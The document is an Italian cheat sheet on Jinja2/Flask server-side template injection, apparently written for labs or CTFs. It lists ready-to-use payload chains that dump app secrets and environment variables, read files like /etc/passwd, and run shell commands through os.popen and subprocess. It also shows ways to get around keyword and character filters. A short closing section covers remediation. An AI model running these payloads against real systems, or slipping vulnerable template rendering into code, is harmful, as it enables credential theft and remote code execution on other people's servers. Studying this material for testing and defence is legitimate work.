# 🐍 Jinja2 / Flask SSTI: Object Traversal & Introspection Cheat Sheet

```
[ Punto d'Appoggio (Anchor) ] ➔ [ Risalita (MRO / Globals) ] ➔ [ Accesso ai Builtins ] ➔ [ Esecuzione / File Read ]
```

---

## 1. I Mattoncini Fondamentali dell'Introspezione Python

In Python **tutto è un oggetto**. Ogni oggetto possiede attributi speciali (chiamati *dunder methods*, con doppio trattino basso `__`) che permettono di navigare l'intera gerarchia del runtime.

| Metodo Dunder | Cosa rappresenta | A cosa serve nell'analisi |
| :--- | :--- | :--- |
| `__class__` | La classe che ha istanziato l'oggetto corrente. | Trasforma un'istanza (es. una stringa `""`) nel suo tipo (`<class 'str'>`). |
| `__base__` / `__bases__` | La classe genitore (*parent class*) da cui eredita. | Risale di un livello nell'albero genealogico delle classi. |
| `__mro__` | *Method Resolution Order*: la lista completa delle classi antenate fino a `object`. | Permette di raggiungere la radice universale di Python: `object` (di solito `__mro__[1]`). |
| `__subclasses__()` | Lista di **tutte le classi** caricate in memoria che ereditano da `object`. | Miniera d'oro: contiene centinaia di moduli attivi (compresi `os`, `subprocess`, `warnings`). |
| `__globals__` | Dizionario contenente le variabili, funzioni e moduli visibili in quello scope. | Espone l'ambiente globale del file in cui è definita la funzione. |
| `__builtins__` | La cassetta degli attrezzi nativa di Python (`open`, `eval`, `__import__`, `len`). | Contiene gli strumenti di sistema bloccati nativamente dal motore del template. |

---

## 2. I Punti d'Ingresso (Gli "Anchor" consentiti in Flask/Jinja2)

All'interno di un template Jinja2, molte funzioni built-in sono rimosse. Dobbiamo partire da un oggetto **già presente nel contesto** del template per iniziare la scalata:

### A. Se sei dentro Flask (Web Application)
* **`config`:** L'oggetto di configurazione dell'app.
* **`request`:** L'oggetto della richiesta HTTP corrente.
* **`url_for`:** Funzione di routing di Flask.
* **`lipsum`:** Generatore di testo lorem ipsum (funzione built-in di Jinja2).
* **`cycler` / `joiner`:** Utility native di impaginazione di Jinja2.

### B. Se non hai oggetti Flask (Jinja2 Puro o Sandbox isolata)
Puoi usare **qualsiasi tipo di dato primitivo** generabile tra le graffe:
* Una stringa vuota: `""`
* Una tupla vuota: `()`
* Una lista vuota: `[]`
* Un numero: `0`

---

## 3. Le Catene di Navigazione (Traversal Chains)

### Livello 1: Ricognizione e Dump delle Configurazioni (Zero rischi)
Prima di cercare file o codice, si verifica cosa è già esposto in chiaro:

```jinja2
{# 1. Dump di tutte le configurazioni e chiavi segrete dell'app #}
{{ config.items() }}

{# 2. Dump di una singola variabile nota (es. la chiave segreta o la flag) #}
{{ config['SECRET_KEY'] }}
{{ config['FLAG'] }}

{# 3. Lettura delle variabili d'ambiente del server (OS Environment) #}
{{ lipsum.__globals__['os'].environ }}
```

---

### Livello 2: Lettura di File Arbitrari (Arbitrary File Read)

#### Percorso A: Tramite l'oggetto `request` (la catena vista nel lab)
```jinja2
{{ request.application.__globals__.__builtins__.open('/etc/passwd').read() }}
```
* **Spiegazione:** `request` $\rightarrow$ risale all'app WSGI $\rightarrow$ apre i simboli globali $\rightarrow$ estrae `open()` da `__builtins__` $\rightarrow$ legge il file.

#### Percorso B: Tramite `lipsum` o `url_for` (più corto e affidabile)
```jinja2
{{ lipsum.__globals__.__builtins__.open('flag.txt').read() }}
{{ url_for.__globals__.__builtins__.open('flag.txt').read() }}
```

#### Percorso C: Tramite Primitive (`""` - Evasione pura senza variabili web)
Se il contesto non passa né `request` né `lipsum`:
```jinja2
{{ "".__class__.__mro__[1].__subclasses__() }}
```
* Questo comando restituisce l'array di **tutte le classi** in memoria. 
* Si cerca l'indice della classe `<class '_io.FileIO'>` o `<class 'subprocess.Popen'>` per invocare il metodo desiderato.

---

### Livello 3: Esecuzione di Comandi di Sistema (RCE)

Quando l'obiettivo della valutazione è verificare se il server permette l'esecuzione arbitraria di comandi di sistema:

#### Tramite `os.popen` (Restituisce l'output a schermo)
```jinja2
{# 1. Via lipsum e modulo OS #}
{{ lipsum.__globals__['os'].popen('id').read() }}

{# 2. Via cycler importando os al volo #}
{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

#### Tramite `subprocess.Popen` (Diretto)
```jinja2
{{ request.application.__globals__.__builtins__.__import__('subprocess').check_output('ls -la', shell=True).decode() }}
```

---

## 4. Tecniche di Evasione dei Filtri (Filter & WAF Bypass)

Spesso gli sviluppatori cercano di difendersi inserendo "filtri a parole vietate" (*Blacklist*). Ecco come la sintassi di Python/Jinja2 permette di aggirarli:

### A. Bypass se bloccano i punti (`.`)
In Python, accedere a un attributo con `oggetto.attributo` è equivalente a usare il filtro Jinja2 `attr()` o le parentesi quadre:
```jinja2
{# Equivalente a: request.__class__ #}
{{ request['__class__'] }}
{{ request|attr('__class__') }}
```

### B. Bypass se bloccano le parole chiave (es. `os`, `open`, `flag`, `__globals__`)
Puoi costruire le stringhe tramite **concatenazione** o codifica:
```jinja2
{# Concatenazione semplice #}
{{ lipsum['__glo' + 'bals__']['o' + 's'].popen('whoami').read() }}

{# Tramite parametri passati nella Query String (GET) #}
{# Invia la richiesta HTTP a: /page?cmd=id&p1=os #}
{{ lipsum.__globals__[request.args.p1].popen(request.args.cmd).read() }}
```

### C. Bypass se bloccano le parentesi graffe `{{ ... }}`
In Jinja2 i blocchi logici usano le graffe con percentuale `{% ... %}`:
```jinja2
{% print(lipsum.__globals__['os'].popen('whoami').read()) %}
```

---

## 5. Remediation: Come si blindano i Template in Produzione?

La presenza di SSTI è sempre frutto di una **violazione della separazione tra codice e dati**.

| Pratica Errata (Vulnerabile) | Pratica Corretta (Sicura) |
| :--- | :--- |
| `render_template_string(user_input)` <br> *Compila direttamente la stringa inviata dall'utente come template.* | `render_template('template.html', content=user_input)` <br> *Passa l'input come variabile interna al template.* |
| Concatenazione manuale di stringhe prima del render: <br> `"<h1>" + input + "</h1>"` | Rendering contestuale con escaping automatico: <br> `<h1>{{ content }}</h1>` (HTML entity escaping attivo). |
| Uso di ambienti Jinja2 privi di sandbox su dati non fidati. | Uso esplicito di **`jinja2.sandbox.SandboxedEnvironment`** per bloccare l'accesso agli attributi dunder (`__class__`, `__globals__`). |
